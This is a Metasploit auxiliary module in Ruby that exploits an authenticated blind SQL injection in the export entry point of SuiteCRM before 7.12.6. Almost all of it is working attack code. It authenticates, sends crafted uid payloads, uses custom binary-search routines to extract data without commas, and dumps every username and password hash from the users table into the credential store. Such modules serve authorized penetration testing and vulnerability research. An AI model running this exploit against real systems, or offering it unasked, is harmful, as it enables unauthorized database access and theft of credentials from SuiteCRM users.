##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::SQLi
  include Msf::Exploit::Remote::HttpClient

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SuiteCRM authenticated SQL injection in export functionality',
        'Description' => %q{
          This module exploits an authenticated SQL injection in SuiteCRM in versions before 7.12.6. The vulnerability
          allows an authenticated attacker to send specially crafted requests to the export entry point of the application in order
          to retrieve all the usernames and their associated password from the database.
        },
        'Author' => [
          'Exodus Intelligence', # Advisory
          'jheysel-r7', # poc + msf module
          'Redouane NIBOUCHA <rniboucha@yahoo.fr>' # sql injection help
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://blog.exodusintel.com/2022/06/09/salesagility-suitecrm-export-request-sql-injection-vulnerability/'],
          ['URL', 'https://docs.suitecrm.com/admin/releases/7.12.x/#_7_12_6']
        ],
        'Actions' => [
          ['Dump credentials', { 'Description' => 'Dumps usernames and passwords from the users table' }]
        ],
        'DefaultAction' => 'Dump credentials',
        'DisclosureDate' => '2022-05-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        },
        'Privileged' => true
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),
      OptString.new('USERNAME', [true, 'Username of user', '']),
      OptString.new('PASSWORD', [true, 'Password for user', '']),
    ]
  end

  def check
    authenticated = authenticate
    return Exploit::CheckCode::Safe('Unable to authenticate to SuiteCRM') unless authenticated

    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_get' => {
          'module' => 'Home',
          'action' => 'About'
        }
      }
    )

    return Exploit::CheckCode::Safe('Trying to query the SuiteCRM version information failed') unless res&.body

    version = Rex::Version.new(res.body.match(/Version\s+((?:\d+\.)+\d+).*/)[1])
    return Exploit::CheckCode::Safe('Could not find retrieve the version of SuiteCRM from the version page') unless version

    print_status "Version detected: #{version}"

    return Exploit::CheckCode::Vulnerable if version <= Rex::Version.new('7.12.5')

    Exploit::CheckCode::Safe
  end

  def authenticate
    print_status("Authenticating as #{datastore['USERNAME']}")
    initial_req = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_get' => {
          'module' => 'Users',
          'action' => 'Login'
        }
      }
    )

    return false unless initial_req && initial_req.code == 200 && initial_req.body.include?('SuiteCRM') && initial_req.get_cookies.include?('sugar_user_theme=')

    login = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_post' => {
          'module' => 'Users',
          'action' => 'Authenticate',
          'return_module' => 'Users',
          'return_action' => 'Login',
          'user_name' => datastore['USERNAME'],
          'username_password' => datastore['PASSWORD'],
          'Login' => 'Log In'
        }
      }
    )

    return false unless login && login.code == 302 && login.headers['Location'] == 'index.php?module=Home&action=index' && login.get_cookies.include?('sugar_user_theme=')

    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_get' => {
          'module' => 'Administration',
          'action' => 'index'
        }
      }
    )

    if res && res.code == 200 && res.body.include?('SuiteCRM') && res.get_cookies.include?('sugar_user_theme=') && res.body.include?('SUGAR.unifiedSearchAdvanced')
      print_good("Authenticated as: #{datastore['USERNAME']}")
      true
    else
      print_error("Failed to authenticate as: #{datastore['USERNAME']}")
      false
    end
  end

  # This module sends this same request multiple times. In order to reduce code it has beed moved it into it's owm method
  def send_injection_request_cgi(payload)
    res = send_request_cgi({
      'method' => 'POST',
      'keep_cookies' => true,
      'uri' => normalize_uri(target_uri.path, 'index.php?entryPoint=export'),
      'encode_params' => false,
      'vars_post' => {
        'uid' => payload,
        'module' => 'Accounts',
        'action' => 'index'
      }
    })

    if res&.code != 200
      fail_with(Failure::UnexpectedReply, "The server did not respond to the request with the payload: #{payload}")
    end
    res
  end

  # @return an array of usernames
  def get_user_names(sqli)
    print_status 'Fetching Users, please wait...'
    users = sqli.run_sql('select group_concat(DISTINCT user_name) from users')
    users.split(',')
  end

  # Use blind boolean SQL injection to determine the user_hashes of given usernames
  def get_user_hashes(sqli, users)
    print_status 'Fetching Hashes, please wait...'
    hashes = []
    number_of_users = users.size
    users.each_with_index do |username, index|
      hash = sqli.run_sql("select user_hash from users where user_name='#{username}'")
      hashes << [username, hash]
      print_good "(#{index + 1}/#{number_of_users}) Username : #{username} ; Hash : #{hash}"
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: username,
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
        private_data: hash,
        service_name: 'SuiteCRM',
        address: datastore['RHOSTS'],
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
    end
    hashes
  end

  def init_sqli
    wrong_resp_length = send_injection_request_cgi(',\\,))+AND+1=2;+--+')&.body&.length
    fail_with(Failure::UnexpectedReply, 'The server responded unexpectedly to a request sent with uid: ",\\,))+AND+1=2;+--+"') unless wrong_resp_length
    sqli = create_sqli(dbms: MySQLi::BooleanBasedBlind, opts: { hex_encode_strings: true }) do |payload|
      fail_with(Failure::BadConfig, 'comma in payload') if payload.include?(',')
      resp_length = send_injection_request_cgi(",\\,))+OR+(#{payload});+--+")&.body&.length
      resp_length != wrong_resp_length
    end

    # redefine blind_detect_length and blind_dump_data because of the bad characters the payload cannot include

    def sqli.blind_detect_length(query, _timebased)
      output_length = 0
      min_length = 0
      max_length = 800
      loop do
        break if blind_request("length(cast((#{query}) as binary))=#{output_length}")

        flag = blind_request("length(cast((#{query}) as binary))+BETWEEN+#{output_length}+AND+#{max_length}")
        if flag
          min_length = output_length + 1
          if max_length - min_length <= 1
            if blind_request("length(cast((#{query}) as binary))=#{min_length}")
              output_length = min_length
              break
            elsif blind_request("length(cast((#{query}) as binary))=#{max_length}")
              output_length = max_length
              break
            else
              fail_with(Failure::UnexpectedReply, 'Somehow this got messed up!')
            end
          end
          output_length = (min_length + max_length) / 2 + 1
        else
          max_length = output_length
          output_length = (min_length + max_length) / 2 - 1
        end
      end
      output_length
    end

    def sqli.blind_dump_data(query, length, _known_bits, _bits_to_guess, _timebased)
      output = [ ]
      position = 1
      length.times do |_j|
        character_value = 0
        min_value = 0
        max_value = 1000
        loop do
          break if blind_request("(select ascii(substr((#{query}) from #{position} for 1)))=#{character_value}")

          flag = blind_request("(select ascii(substr((#{query}) from #{position} for 1)))+BETWEEN+#{character_value}+AND+#{max_value}")
          if flag
            min_value = character_value + 1
            if max_value - min_value <= 1
              if blind_request("(select ascii(substr((#{query}) from #{position} for 1)))=#{min_value}")
                character_value = min_value
                break
              elsif blind_request("(select ascii(substr((#{query}) from #{position} for 1)))=#{max_value}")
                character_value = max_value
                break
              else
                fail_with(Failure::UnexpectedReply, 'Somehow this got messed up!')
              end
            end
            character_value = (min_value + max_value) / 2 + 1
          else
            max_value = character_value
            character_value = (min_value + max_value) / 2 - 1
          end
        end

        position += 1
        output << character_value
      end
      output.map(&:chr).join
    end

    sqli
  end

  def run
    unless datastore['AutoCheck']
      authenticated = authenticate
      fail_with(Failure::NoAccess, 'Unable to authenticate to SuiteCRM') unless authenticated
    end

    sqli = init_sqli
    users = get_user_names(sqli)

    user_table = Rex::Text::Table.new(
      'Header' => 'SuiteCRM User Names',
      'Indent' => 1,
      'Columns' => ['Username']
    )

    users.each do |user|
      user_table << [user]
    end

    print_line user_table.to_s
    creds = get_user_hashes(sqli, users)
    creds_table = Rex::Text::Table.new(
      'Header' => 'SuiteCRM User Credentials',
      'Indent' => 1,
      'Columns' => ['Username', 'Hash']
    )

    creds.each do |cred|
      creds_table << [cred[0], cred[1]]
    end
    print_line creds_table.to_s
  end
end
